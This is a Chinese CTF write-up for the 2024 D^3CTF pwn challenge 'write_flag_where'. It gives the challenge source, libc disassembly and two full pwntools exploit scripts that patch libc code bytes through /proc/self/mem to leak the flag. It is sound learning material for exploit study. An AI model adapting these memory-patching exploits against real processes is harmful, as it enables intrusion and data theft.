---
title: 2024d3ctf-PWN
id: 62c87719-a956-4196-b4e5-8dd4910ae497
date: 2024-05-07 22:28:34
auther: yrl
cover: 
excerpt: 2024d3ctf_PWN write_flag_where -> write_mem 附件 部署环境和源码： #include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unist
permalink: /archives/2024d3ctf-PWN
categories:
 - pwn-wp
tags: 
 - write_mem
---

# 2024d3ctf_PWN

## write_flag_where -> write_mem

### 附件

部署环境和源码：
```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_PREFIX "d3ctf{"
#define FLAG_PREFIX_LENGTH (sizeof(FLAG_PREFIX)-1)
#define FLAG_SUFFIX "}"
#define FLAG_SUFFIX_LENGTH (sizeof(FLAG_SUFFIX)-1)
#define LIBC_NAME "libc"

char maps[0x1000], flag[0x100];
uint64_t libc_code_addr_start, libc_code_addr_end;

void write_mem(uint64_t addr, uint8_t byte) {
  int fd = open("/proc/self/mem", O_RDWR);
  lseek(fd, addr, SEEK_SET);
  write(fd, &byte, 1);
  close(fd);
}

void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  FILE* maps_stream = fopen("/proc/self/maps", "r");

  int count = 1;
  char *line = NULL;
  uint64_t len = 0;
  uint64_t addr_start = 0, addr_end = 0, offset = 0, major_id = 0, minor_id = 0, inode_id = 0;
  char mode[0x10], file_path[0x100];
  memset(mode, 0, sizeof(mode));
  memset(file_path, 0, sizeof(file_path));

  while (getline(&line, &len, maps_stream) != -1 ) {
    sscanf(line,"%lx-%lx%s%lx%lu:%lu%lu%s",
      &addr_start, &addr_end, mode, &offset,
      &major_id, &minor_id, &inode_id, file_path
    );
    if (count == 9) {
      libc_code_addr_start = addr_start;
      libc_code_addr_end = addr_end;
      break;
    }
    count++;
  }

  if (line) {
    printf("%s", line);
    free(line);
  }
  fclose(maps_stream);

  int fd = open("/flag", O_RDONLY);
  read(fd, flag, 0x100);
  close(fd);
}

int main(int argc, char *argv[]) {
  init();

  uint64_t addr = 0;
  uint offset = 0;

  printf("flag: "FLAG_PREFIX"[a-f0-9]{%lu}"FLAG_SUFFIX"\n", strlen(flag) - FLAG_PREFIX_LENGTH - FLAG_SUFFIX_LENGTH);

  while (scanf("%lu%u", &addr, &offset) == 2) {
    if (!(libc_code_addr_start <= addr && addr < libc_code_addr_end) ||
        !(offset >= FLAG_PREFIX_LENGTH && offset < strlen(flag) - FLAG_SUFFIX_LENGTH))
      break;
    write_mem(addr, flag[offset]);
  }

  return 0;
}

```

## 题目分析

程序首先给了libc代码段的基地址，然后将flag加载到bss段，程序要求输入一个地址和偏移，限制了输入地址的范围必须是libc代码段，偏移大于5，flag内容范围在[a-f0-9]，长度也给了

随后就可以到write_mem往addr处写内存为flag指定偏移的值，`open("/proc/self/mem", O_RDWR)`为加载程序内存，通过此文件描述符可以直接修改程序映射的内存，它和/proc/self/maps映射的区域是相同的，对未映射区域写是会报错的


所以此题我们能够修改libc的代码段为flag的某个值，那怎么将flag输出出来呢？

既然我们能操控libc段代码那么我们就可以通过修改代码中关键跳转使其跳过某些分支或跳转到某些分支，达到爆破或输出flag目的

## 解题思路

1. 使用程序开了canary，我们可以通过修改__stack_chk_fail函数参数的偏移为flag的某位，修改scanf中的canary检查使其不通过，就可通过__stack_chk_fail输出的内容不同间接确定flag内容
```
Dump of assembler code for function __stack_chk_fail:
   0x00007ffff7edfc90 <+0>:     endbr64 
   0x00007ffff7edfc94 <+4>:     push   rax
   0x00007ffff7edfc95 <+5>:     pop    rax
=> 0x00007ffff7edfc96 <+6>:     lea    rdi,[rip+0x873da]        # 0x7ffff7f67077
   0x00007ffff7edfc9d <+13>:    sub    rsp,0x8
   0x00007ffff7edfca1 <+17>:    call   0x7ffff7edfcb0 <__fortify_fail>
End of assembler dump.


Dump of assembler code for function __isoc99_scanf:
   0x00007ffff7e130b0 <+0>:     endbr64 
   0x00007ffff7e130b4 <+4>:     sub    rsp,0xd8
   0x00007ffff7e130bb <+11>:    mov    r10,rdi
   0x00007ffff7e130be <+14>:    mov    QWORD PTR [rsp+0x28],rsi
   0x00007ffff7e130c3 <+19>:    mov    QWORD PTR [rsp+0x30],rdx
   0x00007ffff7e130c8 <+24>:    mov    QWORD PTR [rsp+0x38],rcx
   0x00007ffff7e130cd <+29>:    mov    QWORD PTR [rsp+0x40],r8
   0x00007ffff7e130d2 <+34>:    mov    QWORD PTR [rsp+0x48],r9
   0x00007ffff7e130d7 <+39>:    test   al,al
   0x00007ffff7e130d9 <+41>:    je     0x7ffff7e13112 <__isoc99_scanf+98>
   0x00007ffff7e130db <+43>:    movaps XMMWORD PTR [rsp+0x50],xmm0
   0x00007ffff7e130e0 <+48>:    movaps XMMWORD PTR [rsp+0x60],xmm1
   0x00007ffff7e130e5 <+53>:    movaps XMMWORD PTR [rsp+0x70],xmm2
   0x00007ffff7e130ea <+58>:    movaps XMMWORD PTR [rsp+0x80],xmm3
   0x00007ffff7e130f2 <+66>:    movaps XMMWORD PTR [rsp+0x90],xmm4
   0x00007ffff7e130fa <+74>:    movaps XMMWORD PTR [rsp+0xa0],xmm5
   0x00007ffff7e13102 <+82>:    movaps XMMWORD PTR [rsp+0xb0],xmm6
   0x00007ffff7e1310a <+90>:    movaps XMMWORD PTR [rsp+0xc0],xmm7
   0x00007ffff7e13112 <+98>:    mov    rax,QWORD PTR fs:0x28
   0x00007ffff7e1311b <+107>:   mov    QWORD PTR [rsp+0x18],rax
   0x00007ffff7e13120 <+112>:   xor    eax,eax
   0x00007ffff7e13122 <+114>:   lea    rax,[rsp+0xe0]
   0x00007ffff7e1312a <+122>:   mov    rdx,rsp
   0x00007ffff7e1312d <+125>:   mov    rsi,r10
   0x00007ffff7e13130 <+128>:   mov    QWORD PTR [rsp+0x8],rax
   0x00007ffff7e13135 <+133>:   lea    rax,[rsp+0x20]
   0x00007ffff7e1313a <+138>:   mov    ecx,0x2
   0x00007ffff7e1313f <+143>:   mov    QWORD PTR [rsp+0x10],rax
   0x00007ffff7e13144 <+148>:   mov    rax,QWORD PTR [rip+0x188e75]        # 0x7ffff7f9bfc0
   0x00007ffff7e1314b <+155>:   mov    DWORD PTR [rsp],0x8
   0x00007ffff7e13152 <+162>:   mov    rdi,QWORD PTR [rax]
   0x00007ffff7e13155 <+165>:   mov    DWORD PTR [rsp+0x4],0x30
   0x00007ffff7e1315d <+173>:   call   0x7ffff7e13a00
=> 0x00007ffff7e13162 <+178>:   mov    rcx,QWORD PTR [rsp+0x18]
   0x00007ffff7e13167 <+183>:   xor    rcx,QWORD PTR fs:0x28
   0x00007ffff7e13170 <+192>:   jne    0x7ffff7e1317a <__isoc99_scanf+202>
   0x00007ffff7e13172 <+194>:   add    rsp,0xd8
   0x00007ffff7e13179 <+201>:   ret    
   0x00007ffff7e1317a <+202>:   call   0x7ffff7edfc90 <__stack_chk_fail>
```

通过修改`lea    rdi,[rip+0x873da]`中偏移的最后一字节为flag某字节，然后修改__isoc99_scanf中`0x00007ffff7e13162    mov    rcx,QWORD PTR [rsp+0x18]`的偏移触发canary检测进而跳转到__stack_chk_fail


2. 通过程序中的write函数输出flag，通过修改write函数中跳转，使其跳转到write+32处，通过修改栈偏移控制fd为0/1/2(远程通过socket通信，0/1/2等价)实现将flag逐位输出，当然栈中哪个偏移为0需要逐位尝试爆破得知，最后效果为改`write(fd, &byte, 1)`为`write(0, &byte, 1)`
```
Dump of assembler code for function write:
   0x00007ffff7ebe280 <+0>:     endbr64 
=> 0x00007ffff7ebe284 <+4>:     mov    eax,DWORD PTR fs:0x18
   0x00007ffff7ebe28c <+12>:    test   eax,eax
   0x00007ffff7ebe28e <+14>:    jne    0x7ffff7ebe2a0 <write+32>
   0x00007ffff7ebe290 <+16>:    mov    eax,0x1
   0x00007ffff7ebe295 <+21>:    syscall 
   0x00007ffff7ebe297 <+23>:    cmp    rax,0xfffffffffffff000
   0x00007ffff7ebe29d <+29>:    ja     0x7ffff7ebe2f0 <write+112>
   0x00007ffff7ebe29f <+31>:    ret    
   0x00007ffff7ebe2a0 <+32>:    sub    rsp,0x28
   0x00007ffff7ebe2a4 <+36>:    mov    QWORD PTR [rsp+0x18],rdx
   0x00007ffff7ebe2a9 <+41>:    mov    QWORD PTR [rsp+0x10],rsi
   0x00007ffff7ebe2ae <+46>:    mov    DWORD PTR [rsp+0x8],edi
   0x00007ffff7ebe2b2 <+50>:    call   0x7ffff7e445e0
   0x00007ffff7ebe2b7 <+55>:    mov    rdx,QWORD PTR [rsp+0x18]
   0x00007ffff7ebe2bc <+60>:    mov    rsi,QWORD PTR [rsp+0x10]
   0x00007ffff7ebe2c1 <+65>:    mov    r8d,eax
=> 0x00007ffff7ebe2c4 <+68>:    mov    edi,DWORD PTR [rsp+0x8]
   0x00007ffff7ebe2c8 <+72>:    mov    eax,0x1
   0x00007ffff7ebe2cd <+77>:    syscall 
```

修改`0x00007ffff7ebe284 <+4>:     mov    eax,DWORD PTR fs:0x18`偏移使其跳转到write+32，然后修改`0x00007ffff7ebe2c4 <+68>:    mov    edi,DWORD PTR [rsp+0x8]`偏移控制fd为0，即可实现write(0, &byte, 1)

3. 官方解法是通过修改scanf中对数字符号（+/-）的判别，将符号修改成flag对应字符，再次输入爆破flag的字符，根据下次输入的反馈进行判别，详细查看[官方WP](https://mp.weixin.qq.com/s/0sBfu94em2sR82OYDZF6zQ)

注意远程环境程序内存布局可能和本地不同，需要在docker中调试，具体确定偏移；本地gdb调试和程序直接运行两者内存布局也有些不同，调试时候需要注意

## exp

方法一：
```python
from pwn import *
context.update(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

exe_path = ('./vuln_20.04')
exe = context.binary = ELF(exe_path)
libc = ELF('libc.so.6')

host = '139.224.222.124'
host = '127.0.0.0'
port = 32705
port = 9999

# host = "127.0.0.1"
# port = 9999


def one_gadget(filename, base_addr=0):
  return [(int(i, p)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def gdb_pause(p):
    gdb.attach(p)  
    pause()

def pwn(idx, p):
    # gdb_pause(p)
    libc.address = int(b"0x"+(p.recv(12)), 16)-0x22000

    # print(hex(libc.address+0x5c57d))


    p.sendlineafter(b"}}", str(libc.address+0x12fc99)+" "+str(idx))
    p.sendline(str(libc.address+0x6316c)+" "+str(8))

    p.sendline(str(libc.address+0x6316c)+" "+str(8))
    return p.recvall()[5:]

flag = "d3ctf{"

for i in range(0, 60):
    # p = remote(host, port)
    p = process(exe_path) 

    try:
        res = pwn(i, p)[0:3]
        print(res)
        # pause()
        if res == b"x) ":
            flag += "a"
        elif res == b") [":
            flag += "b"
        elif res == b" [%":
            flag += "c"
        elif res == b"[%p":
            flag += "d"
        elif res == b"%p]":
            flag += "e"
        elif res == b"p] ":
            flag += "f"
        elif res == b"nwi":
            flag += "0"
        elif res == b"win":
            flag += "1"
        elif res == b"ind":
            flag += "2"
        elif res == b"nd_":
            flag += "3"
        elif res == b"d_G":
            flag += "4"
        elif res == b"_Ge":
            flag += "5"
        elif res == b"Get":
            flag += "6"
        elif res == b"etI":
            flag += "7"
        elif res == b"tIP":
            flag += "8"
        elif res == b"IP ":
            flag += "9"
            continue
        # f.write(str(i))
        # f.write(res.decode())
        # f.write("\n")
    except EOFError:
        continue
# f.close()
flag+= "}"
print(flag)
print(len(flag))
```

方法二：
```python
from pwn import *
# context.terminal = ["zellij", "action", "new-pane", "-d", "down", "-c", "--", "zsh", "-c"]
context.update(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

exe_path = ('./vuln_20.04')
exe = context.binary = ELF(exe_path)
libc = ELF('libc.so.6')

host = "127.0.0.1"
port = 9998


def one_gadget(filename, base_addr=0):
  return [(int(i, p)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def gdb_pause(p):
    gdb.attach(p)  
    pause()

def pwn(idx, p):

    return p.recvall()[5:]

flag = "d3ctf{"
# p = process(exe_path) 
p = remote(host,port) 
# gdb_pause(p)
libc.address = int(b"0x"+(p.recv(12)), 16)-0x22000
p.recvuntil(b'[a-f0-9]{')
flag_len = int(p.recvn(2))

p.sendlineafter(b"}}", str(libc.address+0x10e288)+" "+str(6))
# pause()
p.sendline(str(libc.address+0x10e2c7)+" "+str(15))

for i in range(6, 6+flag_len):
    # pause()
    p.sendline(str(libc.address+0x22000)+" "+str(i))
    flag += p.recvrepeat(1).decode().replace('\n','')
    print(flag)

print(flag)
```

## 总结

学到了可以通过/proc/self/mem修改程序映射内存，另外出题思路可以向着限制修改区域来达到限制预期解，比如不允许修改__stack_check_fail，那只能通过修改write的方式进行输出，另外可以扩大flag范围为可见字符集，只要满足flag中有满足可以将fd修改成0/1/2即可